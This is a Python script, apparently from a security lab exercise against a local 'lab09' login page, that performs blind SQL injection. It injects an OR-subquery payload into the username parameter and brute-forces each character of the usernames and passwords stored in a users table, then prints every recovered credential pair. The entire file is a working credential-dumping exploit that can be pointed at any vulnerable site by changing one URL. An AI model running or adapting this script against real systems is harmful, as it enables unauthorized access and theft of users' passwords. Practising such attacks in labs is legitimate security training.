import requests
import string

url="http://localhost/lab09/login.php"

ascii_chars = string.ascii_letters+string.digits+string.punctuation+' ' 

success_indicator = "[+] user and password valid."

def is_query_successful(injected_username):
	params={'u': injected_username, 'p': 'irrelevant'}
#	print(injected_username)
	response = requests.get(url, params=params)
	return success_indicator in response.text

def extract_value(query_template, row_num):
	extracted_value=''

	for pos in range(1,101):
		found_char=False

		for char in ascii_chars:
			injection ='" OR (SELECT BINARY SUBSTRING({0},{1},1) FROM users LIMIT 1 OFFSET {2}) =  "{3}" -- '.format(query_template,pos,row_num,char)
			injection.replace(" ", "%20")

			if is_query_successful(injection):
				extracted_value+=char
				found_char=True
				print('Extracting:{}'.format(extracted_value),end='\r')
				break
		if not found_char:
			break
	return extracted_value

def dump_users():
	users=[]
	for row in range(100):
		print('Extracting row {}'.format(row+1))
		username_query = "username"
		password_query = "password"
		username = extract_value(username_query, row)
		password=extract_value(password_query,row)
		users.append((username, password))
		print('Row {}: Username:{}, Password:{}'.format(row+1,username,password))	
	return users

def check_server(url): 
	response=requests.get(url)
	if response.status_code==200:
		print("Server Connected!")
	else:
		print("status code {}".format(response.status_code))
	

if __name__=="__main__":
	url="http://localhost/lab09/login.php"
	check_server(url)
	users=dump_users()
	for i, (username, password) in enumerate(users):
		print('User {}: Username:{}, Password:{}'.format(i+1,username,password))
